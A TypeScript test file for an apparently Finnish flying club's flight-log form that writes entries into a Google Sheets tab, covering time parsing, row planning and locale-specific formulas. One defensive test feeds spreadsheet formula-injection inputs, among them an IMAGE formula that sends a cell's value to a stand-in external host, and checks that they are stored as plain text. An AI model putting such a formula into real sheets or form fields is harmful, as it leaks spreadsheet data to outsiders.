import { describe, expect, test } from "bun:test";
import {
  clearedFlightCells,
  findWritableRows,
  flightCells,
  FORMULA_ROWS_TO_ADD,
  parseFlightSheet,
  planFlightRows,
  SheetValues,
  typedColumnIndexes,
} from "@/utilities/flightSheetParser";
import { flightRowFormulaCells, formulaSeparator } from "@/utilities/flightSheetTemplate";
import {
  crossesMidnight,
  legTimeError,
  minutesBetween,
  newFlightId,
  normalizeClock,
  overlappingLegs,
  sheetNameFor,
} from "@/utilities/flightFormInput";

const HEADERS = [
  "Päivämäärä", "Päällikkö", "Oppilas / SIC", "Henkilömäärä", "Lentoonlähtöpaikka",
  "Laskupaikka", "Lentoonlähtöaika", "Laskuaika", "Ilmassa oloaika",
  "Kokonais ilmassaoloaika", "Laskujen määrä", "Laskujen kokonaismäärä", "Lennon tarkoitus",
  "Tankkaus", "Öljy", "Tuntimittari", "Huomiot", "ID", "Lähde", "Tila",
];
const flight = (id: string) => [46113, "M. Meikäläinen", "", 2, "EFSA", "EFSA", 0.78, 0.8, 0.02, 238, 1, 12061, "HAR", "", "", "", "", id];
const formulaRow = () => ["", "", "", "", "", "", "", "", 0, 0, "", 0];

describe("form input", () => {
  test("clock times in the ways people type them", () => {
    expect(normalizeClock("1405")).toBe("14:05");
    expect(normalizeClock("14.05")).toBe("14:05");
    expect(normalizeClock("14,05")).toBe("14:05");
    expect(normalizeClock("9:05")).toBe("09:05");
    expect(normalizeClock("905")).toBe("09:05");
    // One-digit minutes are ambiguous: 10.3 may mean 10:30
    expect(normalizeClock("10.3")).toBeNull();
    expect(normalizeClock("24:00")).toBeNull();
    expect(normalizeClock("klo 9")).toBeNull();
  });

  test("minutes between takeoff and landing, across midnight", () => {
    expect(minutesBetween("14.05", "15:29")).toBe(84);
    expect(minutesBetween("23:30", "0020")).toBe(50);
    expect(minutesBetween("14:05", "")).toBeNull();
  });

  test("a landing before the takeoff is past midnight only when the flight stays short", () => {
    expect(legTimeError("14.05", "15.29")).toBeNull();
    expect(legTimeError("23:30", "00:20")).toBeNull();
    expect(crossesMidnight("23:30", "00:20")).toBe(true);
    expect(crossesMidnight("14:05", "15:29")).toBe(false);
    // A typo: 14:30 → 14:10 would be a 23 h 40 min flight
    expect(legTimeError("14:30", "14:10")).toBe("Laskuaika on ennen lentoonlähtöaikaa");
    expect(legTimeError("14:30", "14:30")).toBe("Lentoonlähtö- ja laskuaika ovat samat");
    expect(legTimeError("06:00", "15:00")).toBe("Lento olisi yli 8 tuntia: tarkista ajat");
    expect(legTimeError("14:30", "")).toBe("Anna lentoonlähtö- ja laskuaika, esim. 14.05");
  });

  test("legs of the same day that overlap", () => {
    const leg = (takeoff: string, landing: string) => ({ takeoff, landing });
    expect(overlappingLegs([leg("08:00", "08:40"), leg("09:00", "09:30")])).toBeNull();
    // Back to back is fine
    expect(overlappingLegs([leg("08:00", "08:40"), leg("08:40", "09:30")])).toBeNull();
    expect(overlappingLegs([leg("08:00", "08:40"), leg("09:00", "09:30"), leg("08:20", "09:00")])).toEqual([0, 2]);
    // Past midnight the landing is on the next day
    expect(overlappingLegs([leg("23:30", "00:20"), leg("23:50", "23:55")])).toEqual([0, 1]);
  });

  test("flight IDs are UUIDs, also without crypto.randomUUID", () => {
    const uuid = /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/;
    expect(newFlightId()).toMatch(uuid);
    const original = crypto.randomUUID;
    try {
      // As on a page served over plain http
      (crypto as { randomUUID?: unknown }).randomUUID = undefined;
      const id = newFlightId();
      expect(id).toMatch(uuid);
      expect(newFlightId()).not.toBe(id);
    } finally {
      crypto.randomUUID = original;
    }
  });

  test("sheet names in the M.Meikäläinen style", () => {
    expect(sheetNameFor("Matti Meikäläinen")).toBe("M.Meikäläinen");
    expect(sheetNameFor("Anna Maria Laine")).toBe("A.Laine");
    expect(sheetNameFor("Kalle")).toBe("Kalle");
  });
});

describe("writing to the sheet", () => {
  const sheet = (...rows: unknown[][]): SheetValues => [HEADERS, [], ...(rows as SheetValues)];
  // Every row from 3 on has the formula in the airborne-time column
  const formulas = (rows: number) => ["Ilmassa oloaika", "", ...Array(rows).fill("=H-G")];

  test("new flights go into the pre-filled rows after the last flight", () => {
    const values = sheet(flight("a"), flight("b"), formulaRow(), formulaRow());
    const parsed = parseFlightSheet(values);
    expect(findWritableRows(values, parsed, formulas(4))).toEqual([5, 6]);
  });

  test("a row someone has started typing into is not used", () => {
    const halfTyped = formulaRow();
    halfTyped[1] = "M.Meikäläinen";
    const values = sheet(flight("a"), formulaRow(), halfTyped, formulaRow());
    const parsed = parseFlightSheet(values);
    expect(findWritableRows(values, parsed, formulas(4))).toEqual([4]);
  });

  test("no rows when the formulas have run out", () => {
    const values = sheet(flight("a"));
    const parsed = parseFlightSheet(values);
    expect(findWritableRows(values, parsed, formulas(1))).toEqual([]);
  });

  test("enough pre-filled rows: write into them", () => {
    const values = sheet(flight("a"), formulaRow(), formulaRow());
    const parsed = parseFlightSheet(values);
    expect(planFlightRows(values, parsed, formulas(3), 2)).toEqual({ kind: "write", rows: [4, 5] });
  });

  test("formulas run out: continue them from the last formula row, over empty rows", () => {
    const values = sheet(flight("a"), formulaRow());
    const parsed = parseFlightSheet(values);
    // One pre-filled row left (4), three flights: continue row 4's formulas from row 5 on
    expect(planFlightRows(values, parsed, formulas(2), 3)).toEqual({
      kind: "extend",
      sourceRow: 4,
      firstRow: 5,
      lastRow: 4 + FORMULA_ROWS_TO_ADD,
    });
    // None left: continue the last flight's own formulas
    expect(planFlightRows(sheet(flight("a")), parseFlightSheet(sheet(flight("a"))), formulas(1), 1)).toEqual({
      kind: "extend",
      sourceRow: 3,
      firstRow: 4,
      lastRow: 3 + FORMULA_ROWS_TO_ADD,
    });
  });

  test("a year of sample flights gets as many rows as it needs", () => {
    const values = sheet();
    expect(planFlightRows(values, parseFlightSheet(values), formulas(0), 250)).toMatchObject({
      firstRow: 3,
      lastRow: 252,
    });
  });

  test("an emptied tab, no formula row anywhere: the first new row gets the club's formulas", () => {
    const values = sheet();
    const parsed = parseFlightSheet(values);
    expect(planFlightRows(values, parsed, formulas(0), 1)).toEqual({
      kind: "extend",
      sourceRow: null,
      firstRow: 3,
      lastRow: 2 + FORMULA_ROWS_TO_ADD,
    });
    // At the tab's own columns: G takeoff, H landing, I airborne, J and L totals, K landings
    expect(flightRowFormulaCells(parsed.columns, 3).map((cell) => [cell.column, cell.value])).toEqual([
      [8, "=IF(H3-G3=0,,H3-G3)"],
      [9, "=IF(J2+I3=J2,,J2+I3)"],
      [11, "=IF(L2+K3=L2,,L2+K3)"],
    ]);
    // Sheets reads them in the spreadsheet's locale: a Finnish sheet needs ";"
    expect(flightRowFormulaCells(parsed.columns, 3, ";").map((cell) => cell.value)).toEqual([
      "=IF(H3-G3=0;;H3-G3)",
      "=IF(J2+I3=J2;;J2+I3)",
      "=IF(L2+K3=L2;;L2+K3)",
    ]);
  });

  test("formula argument separator follows the spreadsheet's locale", () => {
    expect(formulaSeparator("fi_FI")).toBe(";");
    expect(formulaSeparator("sv_SE")).toBe(";");
    expect(formulaSeparator("en_US")).toBe(",");
    expect(formulaSeparator("en_GB")).toBe(",");
    expect(formulaSeparator(undefined)).toBe(",");
    expect(formulaSeparator("not a locale")).toBe(",");
  });

  test("formulas stop at a row someone typed into, and never go into typed columns", () => {
    const typed = formulaRow();
    typed[1] = "M.Meikäläinen";
    const values = sheet(flight("a"), [], typed);
    const parsed = parseFlightSheet(values);
    // Only row 4 is free before the typed row 5: room for one flight, not two
    expect(planFlightRows(values, parsed, formulas(1), 1)).toMatchObject({ kind: "extend", firstRow: 4, lastRow: 4 });
    expect(planFlightRows(values, parsed, formulas(1), 2)).toEqual({ kind: "blocked", row: 5 });
    // The formula copies skip every column people or the website type into
    const skipped = typedColumnIndexes(parsed);
    expect(skipped).toContain(parsed.columns.date!);
    expect(skipped).toContain(parsed.columns.status!);
    expect(skipped).not.toContain(parsed.columns.airborne!);
  });

  test("a flight's cells cover only the input columns", () => {
    const parsed = parseFlightSheet(sheet(flight("a")));
    const cells = flightCells(
      {
        id: "new", flightDate: "2026-04-01", picName: "M.Meikäläinen", secondName: null,
        personsOnBoard: 2, departure: "EFSA", arrival: "EFJO", takeoff: "09:30",
        landing: "10:08", landings: 1, purposeCode: "MAT", fuelLitres: 60.5,
        oilQuarts: null, hourMeter: null, remarks: null,
      },
      7,
      parsed.columns
    );
    const byHeader = Object.fromEntries(cells.map((c) => [HEADERS[c.column], c.value]));
    expect(byHeader).toMatchObject({
      "Päivämäärä": "2026-04-01",
      // Times as fractions of a day: as text, a Finnish-locale sheet keeps
      // "09:30" as text and the airborne-time formula shows #VALUE!
      "Lentoonlähtöaika": 570 / 1440,
      "Laskuaika": 608 / 1440,
      // Numbers as numbers: as text, a Finnish-locale sheet reads "1.5" as a date
      "Tankkaus": 60.5,
      "Henkilömäärä": 2,
      "Öljy": "",
      "Päällikkö": "'M.Meikäläinen",
      "Oppilas / SIC": "",
      ID: "'new",
      "Lähde": "'web",
    });
    // Formulas are left alone
    expect(byHeader).not.toHaveProperty("Ilmassa oloaika");
    expect(byHeader).not.toHaveProperty("Kokonais ilmassaoloaika");
    // Tila starts empty (Kirjattu), also when it was filled down into the
    // formula rows below the last flight
    expect(byHeader["Tila"]).toBe("");
    expect(cells.every((c) => c.row === 7)).toBe(true);
  });

  test("typed text never becomes a formula", () => {
    const parsed = parseFlightSheet(sheet(flight("a")));
    const cells = flightCells(
      {
        id: "new", flightDate: "2026-04-01", picName: "=M.Meikäläinen", secondName: "+1",
        personsOnBoard: 1, departure: "EFSA", arrival: "EFSA", takeoff: "09:30",
        landing: "10:08", landings: 1, purposeCode: "HAR", fuelLitres: null,
        oilQuarts: null, hourMeter: null, remarks: '=IMAGE("https://example.invalid/"&A1)',
      },
      7,
      parsed.columns
    );
    const byHeader = Object.fromEntries(cells.map((c) => [HEADERS[c.column], c.value]));
    expect(byHeader["Huomiot"]).toBe(`'=IMAGE("https://example.invalid/"&A1)`);
    expect(byHeader["Päällikkö"]).toBe("'=M.Meikäläinen");
    expect(byHeader["Oppilas / SIC"]).toBe("'+1");
  });

  test("undoing clears the input columns and the source", () => {
    const parsed = parseFlightSheet(sheet(flight("a")));
    const cleared = clearedFlightCells(3, parsed.columns).map((c) => HEADERS[c.column]);
    expect(cleared).toContain("ID");
    expect(cleared).toContain("Lähde");
    expect(cleared).not.toContain("Ilmassa oloaika");
  });
});
